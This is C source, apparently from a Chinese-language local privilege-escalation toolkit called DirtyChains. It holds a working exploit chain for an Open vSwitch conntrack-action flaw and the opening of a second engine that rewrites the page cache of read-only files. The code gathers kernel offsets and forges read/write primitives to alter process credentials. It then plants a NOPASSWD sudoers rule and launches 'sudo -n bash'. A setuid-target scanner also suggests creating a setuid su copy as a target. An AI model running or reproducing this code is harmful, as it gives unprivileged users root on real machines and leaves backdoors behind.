    TH_OUT(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl);
    TH_OUT(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src);
    TH_OUT(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst);
    TH_OUT(OVS_CT_LABELS, ovs_ct_labels);
    TH_OUT(OVS_CT_ACTION_LEN, ovs_ct_action_len);
#undef TH_OUT

    printf("\n/* 行为参数：从调试信息推不出来，只能实机试 */\n");
    printf("#define KREC_REF_KIND      \"%s\"\n",
           k->ref_kind ? "__refcnt" : "__rcuref");
    printf("#define KREC_TUNNEL_INFO   %d\n", g_dump_tunnel_info);
    printf("#define KREC_READ_CARRIER  \"%s\"\n", g_dump_carrier);
    printf("#define KREC_WRITE_CARRIER \"%s\"\n",
           g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("#define KREC_READ_LANES    \"");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s%s", i ? "," : "", krec_lane_names[g_dump_lanes[i]]);
    printf("\"\n\n#endif /* DIRTYFRAG_TARGET_H */\n");

    {
        char major[8] = "?";

        th_major(u->release, major, sizeof(major));
        fprintf(stderr, "\n放到 offset/%s系/%s/target.h 即可（目录名 = uname -r）。\n",
                major, u->release);
    }
}

static void json_escape(const char *s)
{
    putchar('"');
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;

        if (c == '"' || c == '\\')
            printf("\\%c", c);
        else if (c < 0x20)
            printf("\\u%04x", c);
        else
            putchar(c);
    }
    putchar('"');
}

static int dump_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < N_LANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "-lanes ttl,tos,tp_src_0" -> 下标数组 */
static int parse_dump_lanes(const char *arg)
{
    g_dump_lane_count = 0;
    while (*arg) {
        const char *comma = strchr(arg, ',');
        size_t len = comma ? (size_t)(comma - arg) : strlen(arg);
        int id = dump_lane_id(arg, len);

        if (id < 0) {
            fprintf(stderr, "未知 lane: %.*s\n", (int)len, arg);
            return -1;
        }
        if (g_dump_lane_count < N_LANES)
            g_dump_lanes[g_dump_lane_count++] = id;
        if (!comma)
            break;
        arg = comma + 1;
    }
    return 0;
}

static int do_dump_krec(void)
{
    struct koffs k;
    struct utsname u;
    int saved, rc, i;

    if (uname(&u) != 0) {
        fprintf(stderr, "uname 失败: %s\n", strerror(errno));
        return 1;
    }

    if (g_dump_from) {
        /* 从 offset/ 里抄一条：没有 BTF / pahole 时也能造出记录骨架 */
        const char *saved_force = g_krec_force;

        /* th_resolve 的诊断走 stderr，stdout 只留 JSON */
        fflush(stdout);
        saved = dup(STDOUT_FILENO);
        if (saved >= 0)
            dup2(STDERR_FILENO, STDOUT_FILENO);
        g_krec_force = g_dump_from;
        rc = th_resolve(&k);
        g_krec_force = saved_force;
        fflush(stdout);
        if (saved >= 0) {
            dup2(saved, STDOUT_FILENO);
            close(saved);
        }
        if (rc != 0) {
            fprintf(stderr, "offset/ 里没有 release=%s 的 target.h\n",
                    g_dump_from);
            return 1;
        }

        /* 没显式指定的行为参数沿用被抄的那条 */
        if (!g_dump_carrier_set) {
            g_dump_carrier = g_krec_hit.read_carrier ? "labels-only" : "timeout";
            g_dump_wcarrier = g_krec_hit.write_carrier ? "labels-only" : "timeout";
        }
        if (!g_dump_lanes_set) {
            g_dump_lane_count = g_krec_hit.lane_count;
            memcpy(g_dump_lanes, g_krec_hit.lane_order,
                   sizeof(g_dump_lanes[0]) * (size_t)g_dump_lane_count);
        }
        if (!g_dump_ti_set)
            g_dump_tunnel_info = g_krec_hit.tunnel_info;

        fprintf(stderr, "注意：偏移抄自 %s，不是本机推导。\n", g_dump_from);
    } else {
        /* 推导过程的中文诊断全部导到 stderr，stdout 只留 JSON */
        fflush(stdout);
        saved = dup(STDOUT_FILENO);
        if (saved >= 0)
            dup2(STDERR_FILENO, STDOUT_FILENO);
        g_force_derive = 1;
        rc = derive_offsets(&k);
        fflush(stdout);
        if (saved >= 0) {
            dup2(saved, STDOUT_FILENO);
            close(saved);
        }
        if (rc != 0) {
            fprintf(stderr, "\n推导失败。需要 pahole（sudo apt install dwarves）"
                            "和符号表：\n"
                            "  /boot/System.map-%s，或 root 读 /proc/kallsyms。\n"
                            "如果卡在 ovs_conntrack_info：先 sudo modprobe "
                            "openvswitch 再试。\n", u.release);
            return 1;
        }
    }

    if (!g_dump_lane_count) {          /* 没指定就按默认全量顺序 */
        for (i = 0; i < N_LANES; i++)
            g_dump_lanes[i] = i;
        g_dump_lane_count = N_LANES;
    }
    if (g_dump_target) {
        print_target(&k, &u);
        return 0;
    }

    printf("{\n  \"release\": ");
    json_escape(u.release);
    printf(",\n  \"version\": ");
    json_escape(u.version);
    printf(",\n  \"machine\": ");
    json_escape(u.machine);
    printf(",\n  \"offsets\": {\n");

#define KREC_JSON_INT(name) \
    printf("    \"" #name "\": %d,\n", k.name)

    KREC_JSON_INT(nf_conntrack_helper_me);
    KREC_JSON_INT(module_kobj_ktype);
    KREC_JSON_INT(task_pid);
    KREC_JSON_INT(task_cred);
    KREC_JSON_INT(task_pid_links);
    KREC_JSON_INT(cred_fsuid);
    KREC_JSON_INT(cred_fsgid);
    KREC_JSON_INT(cred_cap_permitted);
    KREC_JSON_INT(cred_cap_effective);
    KREC_JSON_INT(pid_namespace_idr);
    KREC_JSON_INT(idr_idr_rt);
    KREC_JSON_INT(idr_base);
    KREC_JSON_INT(xarray_xa_head);
    KREC_JSON_INT(xa_node_shift);
    KREC_JSON_INT(xa_node_slots);
    KREC_JSON_INT(pid_tasks);
    KREC_JSON_INT(hlist_head_first);
    KREC_JSON_INT(dst_entry_ref);
    KREC_JSON_INT(metadata_dst_tun_info);
    KREC_JSON_INT(ip_tunnel_key_ipv4_src);
    KREC_JSON_INT(ip_tunnel_key_ipv4_dst);
    KREC_JSON_INT(ip_tunnel_key_tos);
    KREC_JSON_INT(ip_tunnel_key_ttl);
    KREC_JSON_INT(ip_tunnel_key_tp_src);
    KREC_JSON_INT(ip_tunnel_key_tp_dst);
    KREC_JSON_INT(ovs_ct_labels);
    printf("    \"ovs_ct_action_len\": %d,\n", k.ovs_ct_action_len);
#undef KREC_JSON_INT
    printf("    \"vmlinux_module_ktype\": %lu,\n", k.vmlinux_module_ktype);
    printf("    \"vmlinux_init_pid_ns\": %lu,\n", k.vmlinux_init_pid_ns);
    printf("    \"dst_entry_ref_kind\": \"%s\"\n",
           k.ref_kind ? "__refcnt" : "__rcuref");
    printf("  },\n  \"read_carrier\": \"%s\",\n  \"write_carrier\": \"%s\",\n",
           g_dump_carrier, g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("  \"read_lanes\": [");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s\"%s\"", i ? ", " : "", krec_lane_names[g_dump_lanes[i]]);
    printf("],\n  \"ovs_key_attr_tunnel_info\": %d\n}\n", g_dump_tunnel_info);

    fprintf(stderr, "\n存成 rec.json，然后：python3 tools/mk_offset.py rec.json --root offset\n"
                    "行为参数（carrier / lanes / tunnel_info）本机推导不出来，"
                    "用 -carrier / -lanes / -tunnel-info 覆盖。\n");
    return 0;
}

/* -------------------------------------------------------------------------
 * 三个模式
 * ---------------------------------------------------------------------- */

static int file_readable(const char *path)
{
    return access(path, R_OK) == 0;
}

static int do_check(void)
{
    FILE *f;
    char buf[256];
    int fails = 0;

    pr_dim("  uname: ");
    if (run_cmd("uname -a", buf, sizeof(buf)) > 0) {
        buf[strcspn(buf, "\n")] = '\0';
        pr_raw("%s\n", buf);
    }

    pr_dim("  openvswitch 模块: ");
    if (access("/sys/module/openvswitch", F_OK) == 0)
        pr_ok("已加载\n");
    else {
        pr_err("未加载\n");
        pr_dim("    先 sudo modprobe openvswitch；Ubuntu 上需要\n"
               "    linux-modules-extra-$(uname -r) 或 openvswitch 包。\n");
        fails++;
    }

    /* 先看配置表：命中的话下面三项本地推导都不需要 */
    {
        struct koffs probe;

        if (krec_resolve(&probe) != 0) {
            pr_dim("  本地推导（配置表未命中）：\n");

            pr_dim("    BTF: ");
            if (file_readable(BTF_VMLINUX))
                pr_ok("%s 可读\n", BTF_VMLINUX);
            else {
                pr_err("不可读\n");
                pr_dim("      需要 CONFIG_DEBUG_INFO_BTF；Ubuntu 20.04 的 5.4/5.8 内核\n"
                       "      多半没有，可以改装带 BTF 的 HWE 内核。\n");
                fails++;
            }

            pr_dim("    pahole: ");
            if (have_binary("pahole"))
                pr_ok("已安装\n");
            else {
                pr_err("缺失\n");
                pr_dim("      sudo apt install dwarves\n");
                fails++;
            }

            pr_dim("    符号表: ");
            {
                struct koffs k;

                if (derive_symbols(&k) == 0)
                    pr_ok("可用（module_ktype=0x%lx init_pid_ns=0x%lx 相对 _text）\n",
                          k.vmlinux_module_ktype, k.vmlinux_init_pid_ns);
                else {
                    pr_err("不可用\n");
                    pr_dim("      /proc/kallsyms 的地址被 kptr_restrict 清零时，\n"
                           "      需要 /boot/System.map-$(uname -r)（linux-image 包自带）。\n");
                    fails++;
                }
            }
        } else {
            pr_dim("  BTF / pahole / System.map: 不需要（偏移来自 %s）\n",
                   g_krec_src[0] ? g_krec_src : "配置表");
        }
    }

    pr_dim("  unprivileged_userns_clone: ");
    f = fopen("/proc/sys/kernel/unprivileged_userns_clone", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = '\0';
            if (!strcmp(buf, "1"))
                pr_ok("1\n");
            else {
                pr_err("%s\n", buf);
                fails++;
            }
        }
        fclose(f);
    } else {
        pr_dim("（内核没有这个开关，视为允许）\n");
    }

    pr_dim("  sudo 基线: ");
    if (sudo_works())
        pr_err("当前用户已有免密 sudo，root shell 没有对比意义\n");
    else
        pr_ok("需要密码（正常）\n");

    printf("\n");
    if (fails == 0)
        pr_ok("前置条件齐全，可以跑 -scan 或 -start。\n");
    else
        pr_err("有 %d 项不满足，直接跑会在对应步骤停下（不会破坏系统）。\n", fails);
    return fails == 0 ? 0 : 1;
}

static int do_scan(struct prim *p)
{
    uint64_t v = 0;

    pr_step("自检：读 vmlinux 里的 module_ktype");
    {
        uint64_t addr = p->kernel_base + p->k.vmlinux_module_ktype;

        if (read_kptr(&p->r, addr, "module_ktype", &v) != 0)
            return -1;
        if (v != p->module_ktype) {
            pr_err("  读回 0x%llx，与泄漏推导的 0x%llx 不一致\n",
                   (unsigned long long)v, (unsigned long long)p->module_ktype);
            return -1;
        }
        pr_ok("  读回一致: 0x%llx\n", (unsigned long long)v);
    }

    pr_step("自检：定位当前进程的 task_struct");
    {
        uint64_t task = 0;

        if (locate_task(&p->r, p->kernel_base, getpid(), &task) != 0)
            return -1;
        pr_ok("  当前 pid=%d task=0x%llx\n", getpid(), (unsigned long long)task);
    }

    printf("\n");
    pr_ok("读原语可用；写原语未执行（-scan 不会修改任何东西）。\n");
    pr_dim("    要真正提权，用 -start。\n");
    return 0;
}

static int do_start(struct prim *p, int writer_pid, int trig_fd, int ack_fd)
{
    uint64_t task = 0, cred = 0;
    char ack[600];
    int total = 0;
    ssize_t n;

    pr_step("定位 host writer 的 cred");
    if (locate_task(&p->r, p->kernel_base, writer_pid, &task) != 0)
        return -1;
    if (read_kptr(&p->r, task + (uint64_t)p->k.task_cred, "task->cred", &cred) != 0)
        return -1;
    pr_dim("  writer pid=%d task=0x%llx cred=0x%llx\n",
           writer_pid, (unsigned long long)task, (unsigned long long)cred);

    pr_step("改写 writer 的 cred");
    if (p->k.ref_kind == 0) {
        /* 新内核：dst_entry 用 __rcuref，只能一次减 1，靠次数把 fsuid 减到 0 */
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsuid,
                              "fsuid") != 0)
            return -1;
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsgid,
                              "fsgid") != 0)
            return -1;
    } else {
        /* 旧内核：__refcnt 是 atomic_t，0 减一次回绕成 0xffffffff */
        if (panic_on_warn()) {
            pr_err("  panic_on_warn=1，旧内核的回绕会触发 WARN 并重启；先关掉\n");
            return -1;
        }
        pr_dim("  legacy __refcnt：capability 字回绕会打一条非致命 WARN\n");
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_permitted,
                             "cap_permitted.low") != 0)
            return -1;
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_effective,
                             "cap_effective.low") != 0)
            return -1;
    }

    pr_step("让 writer 写 sudoers");
    if (write(trig_fd, "1", 1) != 1) {
        pr_err("  触发 writer 失败: %s\n", strerror(errno));
        return -1;
    }
    while (total < (int)sizeof(ack) - 1) {
        n = read(ack_fd, ack + total, sizeof(ack) - 1 - (size_t)total);
        if (n <= 0)
            break;
        total += (int)n;
    }
    ack[total] = '\0';
    close(trig_fd);
    close(ack_fd);

    if (total < 2 || ack[0] != '1') {
        pr_err("  writer 报告失败: %s", total ? ack : "(无应答)\n");
        return -1;
    }
    pr_ok("  sudoers 写入成功: %s", ack + 2);
    return 0;
}

/* -------------------------------------------------------------------------
 * 入口
 * ---------------------------------------------------------------------- */

static void banner(void)
{
    pr_raw("\n");
    if (g_color)
        fputs(C_CYA, stdout);
    pr_raw("CVE-2026-64531  Open vSwitch CT action 越界\n");
    if (g_color)
        fputs(C_RST, stdout);
    pr_dim("  ovswrap %s  ·  C 移植版\n", OVSWRAP_VERSION);
    pr_dim("  攻击链：userns+netns -> OVS datapath -> 伪造 SET action\n"
           "          -> 任意读 / dst_release 递减 -> sudoers -> sudo bash\n");
    pr_dim("  配置表：offset/<N>系/<release>/target.h，放进去就用，不用重编\n");
    pr_dim("  查找顺序：-offset <dir> / $OVSWRAP_OFFSET_DIR / <exe 目录>/offset /\n"
           "            ./offset / /usr/share/dirtychains/offset\n\n");
}

static void usage(const char *prog)
{
    banner();
    pr_raw("用法: %s <模式> [选项]\n\n", prog);
    pr_raw("模式:\n");
    pr_raw("  -check     只做前置条件检查（配置表 / 模块 / BTF / pahole / userns）\n");
    pr_raw("  -dump-krec   导出本机内核偏移记录（JSON），喂给 tools/mk_offset.py\n");
    pr_raw("  -dump-target 导出本机配置表（target.h），放进 offset/<N>系/<release>/\n");
    pr_raw("  没有 BTF 时可以用 tools/kmod 的内核模块直接读偏移（见该目录）\n");
    pr_raw("  -scan      建立读写原语并自检读一个已知地址，不修改任何东西\n");
    pr_raw("  -start     完整链：改 host writer 的 cred -> 写 sudoers -> root shell\n");
    pr_raw("  -h         帮助\n\n");
    pr_raw("选项:\n");
    pr_raw("  -t <user>  指定写入 sudoers 的 host 用户名（默认当前用户）\n");
    pr_raw("  -offset <dir>  配置表根目录（默认 ./offset、<exe 目录>/offset、\n"
           "                 /usr/share/dirtychains/offset）\n");
    pr_raw("  -krec <release>  用另一条 release 的配置（从 offset/ 里按 N系/<release> 找）\n");
    pr_raw("  -force-derive  忽略配置表，强制走 BTF / System.map 推导\n");
    pr_raw("  -carrier / -wcarrier / -lanes / -tunnel-info  "
           "配合 -dump-krec 填行为参数\n");
    pr_raw("  -from <release>  配合 -dump-krec：从 offset/ 抄一条再改成本机的\n");
    pr_raw("  -v         详细输出\n");
    pr_raw("  -nc        关闭彩色\n\n");
    pr_raw("注意:\n");
    pr_raw("  必须以普通用户运行（root 会被拒绝），且 openvswitch 模块已加载。\n");
    pr_raw("  /etc/sudoers 或 /etc/sudoers.d 会被写入一条 NOPASSWD 规则，\n");
    pr_raw("  跑完记得删掉；/etc/sudoers 如果被追加，重启前请先 visudo -c 检查。\n\n");
}

static int dc_scan_setuid(void);   /* 定义在 Fragnesia 段之前，这里先用 */

int ovswrap_main(int argc, char **argv)
{
    int mode = 0;
    const char *user_arg = NULL;
    struct host_user hu;
    struct prim p;
    char dpname[32];
    int i;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-check"))
            mode = 1;
        else if (!strcmp(argv[i], "-scan") || !strcmp(argv[i], "-test"))
            mode = 2;
        else if (!strcmp(argv[i], "-find"))
            mode = 5;           /* 只读扫描, 与 KSU 无关, 不碰 sudoers */
        else if (!strcmp(argv[i], "-start"))
            mode = 3;
        else if (!strcmp(argv[i], "-v"))
            g_verbose = 1;
        else if (!strcmp(argv[i], "-force-derive"))
            g_force_derive = 1;
        else if (!strcmp(argv[i], "-krec") && i + 1 < argc)
            g_krec_force = argv[++i];
        else if (!strcmp(argv[i], "-dump-krec")) {
            mode = 4;
        } else if (!strcmp(argv[i], "-dump-target")) {
            mode = 4;
            g_dump_target = 1;
        } else if (!strcmp(argv[i], "-offset") && i + 1 < argc) {
            g_offset_dir = argv[++i];
        }
        else if (!strcmp(argv[i], "-carrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-carrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_carrier = v;
            g_dump_wcarrier = v;
            g_dump_carrier_set = 1;
        } else if (!strcmp(argv[i], "-wcarrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-wcarrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_wcarrier = v;
        } else if (!strcmp(argv[i], "-lanes") && i + 1 < argc) {
            if (parse_dump_lanes(argv[++i]) != 0)
                return 2;
            g_dump_lanes_set = 1;
        } else if (!strcmp(argv[i], "-tunnel-info") && i + 1 < argc) {
            g_dump_tunnel_info = atoi(argv[++i]);
            g_dump_ti_set = 1;
        } else if (!strcmp(argv[i], "-from") && i + 1 < argc) {
            g_dump_from = argv[++i];
        }
        else if (!strcmp(argv[i], "-nc"))
            g_color = 0;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else if (!strcmp(argv[i], "-t") && i + 1 < argc) {
            user_arg = argv[++i];
        }
        /* 其它参数（比如 GUI 传进来的 -2026-64531）直接忽略 */
    }

    if (!mode) {
        usage(argv[0]);
        return 2;
    }

    if (mode == 4)
        return do_dump_krec();   /* 不打 banner，stdout 只留 JSON */

    if (mode == 5)
        return dc_scan_setuid();

    banner();

    if (mode == 1)
        return do_check();

    if (check_launch_user(&hu) != 0)
        return 1;
    if (user_arg) {
        snprintf(hu.name, sizeof(hu.name), "%s", user_arg);
        pr_dim("  写入 sudoers 的用户: %s（命令行指定）\n", hu.name);
    } else {
        pr_dim("  写入 sudoers 的用户: %s (uid=%u)\n", hu.name, (unsigned)hu.uid);
    }

    snprintf(dpname, sizeof(dpname), "vhrd%u", (unsigned)(getpid() % 10000));

    if (mode == 2) {
        pid_t pid = fork();
        int st = 0;

        if (pid < 0) {
            pr_err("fork 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            _exit(do_scan(&p) == 0 ? 0 : 4);
        }
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            return 0;
        if (WIFEXITED(st))
            pr_err("自检失败（阶段码 %d）\n", WEXITSTATUS(st));
        return 1;
    }

    /* -start */
    {
        char dropin[128];
        char used_user[64];
        pid_t wpid, pid;
        int trig = -1, ack = -1;
        int st = 0;

        snprintf(used_user, sizeof(used_user), "%s", hu.name);
        snprintf(dropin, sizeof(dropin), "/etc/sudoers.d/ovs_c004_%d", (int)getpid());

        wpid = fork_sudoers_writer(dropin, used_user, &trig, &ack);
        if (wpid < 0) {
            pr_err("fork sudoers writer 失败: %s\n", strerror(errno));
            return 1;
        }

        pid = fork();
        if (pid < 0) {
            pr_err("fork exploit 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            int ret;

            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            ret = do_start(&p, (int)wpid, trig, ack);
            _exit(ret == 0 ? 0 : 4);
        }

        close(trig);
        close(ack);
        waitpid(pid, &st, 0);

        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            if (WIFEXITED(st))
                pr_err("利用失败（阶段码 %d）\n", WEXITSTATUS(st));
            return 1;
        }

        pr_raw("\n");
        pr_ok("提权完成。现在用 sudo -n 打开 root shell…\n");
        pr_dim("    （namespace 里的进程仍然挂着，别手动 kill 它）\n\n");
        execlp("sudo", "sudo", "-n", "bash", (char *)NULL);
        pr_err("exec sudo 失败: %s\n", strerror(errno));
        return 1;
    }
}

/* ===========================================================================
 *  共用：setuid root 文件扫描（-find）
 *
 *  这个模式必须是纯只读的：不建 userns、不碰 XFRM、不写一个字节的页缓存。
 *  之前 46300 / 43503 两个引擎都没有 -find 分支，参数被静默忽略后落到默认的
 *  -start —— 界面上点「扫描 setuid」会直接开始改写目标并 exec 它，看着就是
 *  「点了扫描却自己提权」。现在两个入口都接上这个函数，并且强制要求显式指定
 *  模式，拼错参数一律报错退出，不再猜。
 * ======================================================================== */
#define DC_SCAN_MIN    4096
#define DC_SCAN_DEPTH  6

/* 目标所在挂载点是否带 nosuid：带的话 setuid 位会被内核忽略，写了也提不了权 */
static int dc_mount_nosuid(const char *path)
{
    FILE *f = fopen("/proc/mounts", "r");
    char dev[256], mnt[512], opts[256];
    size_t bestlen = 0;
    int nosuid = 0;

    if (!f)
        return 0;
    while (fscanf(f, "%255s %511s %*s %255s %*s %*s", dev, mnt, opts) == 3) {
        size_t l = strlen(mnt);

        if (strncmp(path, mnt, l) != 0)
            continue;
        if (path[l] != '\0' && path[l] != '/' && l != 1)
            continue;
        if (l >= bestlen) {
            bestlen = l;
            nosuid = (strstr(opts, "nosuid") != NULL);
        }
    }
    (void)dev;
    fclose(f);
    return nosuid;
}

static void dc_scan_dir(const char *dir, int depth, int *total, int *usable)
{
    DIR *d = opendir(dir);
    struct dirent *de;

    if (!d)
        return;
    if (depth > DC_SCAN_DEPTH) {
        closedir(d);
        return;
    }

    while ((de = readdir(d)) != NULL) {
        char p[PATH_MAX];
        struct stat st;

        if (de->d_name[0] == '.')
            continue;
        if (snprintf(p, sizeof(p), "%s/%s", dir, de->d_name) >= (int)sizeof(p))
            continue;
        if (lstat(p, &st) < 0)
            continue;

        if (S_ISDIR(st.st_mode)) {
            if (!strcmp(de->d_name, "proc") || !strcmp(de->d_name, "sys") ||
                !strcmp(de->d_name, "dev") || !strcmp(de->d_name, "run") ||
                !strcmp(de->d_name, "tmp"))
                continue;
            dc_scan_dir(p, depth + 1, total, usable);
            continue;
        }
        if (!S_ISREG(st.st_mode) || !(st.st_mode & S_ISUID))
            continue;
        if (st.st_uid != 0 || !(st.st_mode & S_IXUSR))
            continue;

        (*total)++;

        if ((long long)st.st_size < DC_SCAN_MIN) {
            printf("[-] %-44s %9lld B  too small\n", p, (long long)st.st_size);
            continue;
        }
        if (access(p, W_OK) == 0) {
            printf("[-] %-44s %9lld B  writable by you\n", p,
                   (long long)st.st_size);
            continue;
        }
        if (dc_mount_nosuid(p)) {
            printf("[!] %-44s %9lld B  nosuid mount\n", p, (long long)st.st_size);
            continue;
        }
        printf("[+] %-44s %9lld B\n", p, (long long)st.st_size);
        (*usable)++;
    }
    closedir(d);
}

static int dc_scan_setuid(void)
{
    static const char *roots[] = {
        "/usr/bin", "/usr/sbin", "/bin", "/sbin",
        "/usr/lib", "/usr/libexec", "/usr/local/bin",
        "/usr/local/sbin", "/opt", NULL
    };
    int total = 0, usable = 0, i;

    printf("[*] 扫描 setuid root 文件（只读：不建 userns、不碰 XFRM、不写任何文件）\n");
    printf("[*] 判定: 普通文件 uid=0 有 u+x, >= %d B, 当前用户不可写, 非 nosuid\n",
           DC_SCAN_MIN);
    if (geteuid() == 0)
        printf("[!] 当前是 root：root 对任何文件都有写权限，下面会全部标成 "
               "writable by you，这个判定只对普通用户有意义\n");
    printf("\n");

    for (i = 0; roots[i]; i++)
        dc_scan_dir(roots[i], 0, &total, &usable);

    printf("\n[*] 共 %d 个 setuid root 文件, 其中 %d 个可用作靶子\n", total, usable);
    if (usable) {
        printf("[*] 用法: -t <'[+]' 的路径> -test 先自测, 确认能过再 -start\n");
        printf("[!] 直接打进系统文件会留下一个 setuid root 的后门 shell, 用完必须"
               "重装该包: apt-get install --reinstall -y <包名>\n");
    } else {
        printf("[-] 没有可用靶子。自己造一个副本:\n");
        printf("    sudo cp /usr/bin/su /var/tmp/t && sudo chown root:root "
               "/var/tmp/t && sudo chmod 4755 /var/tmp/t\n");
    }
    return usable ? 0 : 1;
}

/* ==========================================================================
 *  第二部分：GTK3 前端
 * ==========================================================================*/
#ifndef OVSWRAP_STANDALONE

/* ============================================================================
 *  dirtyfrag-gui.c — DirtyChains 十链本地提权 PoC 的图形前端
 *
 *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
 *      · 拼出正确的命令行
 *      · 在伪终端 (pty) 里启动 poc, 让 poc 的彩色日志与交互式 shell 都正常
 *      · 把输出实时渲染到窗口里, 并解析 ANSI 颜色
 *      · 把输入框的内容发回 pty (提权成功后这里就是 root shell)
 *
 *  之所以用 pty 而不是普通管道: poc 的 color_enabled() 依赖 isatty(),
 *  且 43284/43494/46331 成功后会 execl 到 /bin/sh 或 su, 没有 tty 会退化。
 *
 *  编译:
 *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
 *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
 * ==========================================================================*/

#define _GNU_SOURCE
#include <gtk/gtk.h>
#include <gdk/gdkkeysyms.h>

#include <pty.h>
#include <utmp.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>

/* ==========================================================================
 *  Fragnesia 引擎：CVE-2026-46300（入口 fragnesia_main）
 *
 *  代码取自上游 PoC（V12 · William Bowling），逻辑保持原样，只动了三处：
 *    · main() 改名 fragnesia_run()、usage() 改名 frag_usage()，避免和本文件里
 *      ovswrap 的同名函数撞车；
 *    · 删掉与上面重复的 C_DIM / C_RED 宏（值完全相同）；
 *    · 在两道 gate 之后加一个 FRAGNESIA_CHECK_ONLY 提前返回，
 *      给 GUI 的「检查前置条件」用。
 *
 *  原理：xfrm espintcp 把 ESP 分片塞进 TCP 流，接收端做 TCP coalesce 之后，
 *  关掉加密的 ESP payload 被当成普通 TCP 数据 splice 回 page cache，于是
 *  非特权用户可以改写只读文件的页缓存——文件权限和 inode 都不变，字节已经变了。
 *  Ubuntu 默认挡非特权 userns，要先：
 *      sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
 *
 *  退出码和另外几条链相反，0 和 1 的含义是对调的：
 *    1 有漏洞（字节被改写） / 0 未观察到改写 / 2 参数或目标文件错 / 4 前置条件不满足
 * ==========================================================================*/


#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/sctp.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif

#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556

#define PAYLOAD_LEN         192
#define FRAME_PAYLOAD_ROWS  12      /* ceil(PAYLOAD_LEN / 16) */
#define FRAME_BAR_W         50
#define FRAME_LINES         15      /* 1 header + 12 hex + 1 bar + 1 sep */

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

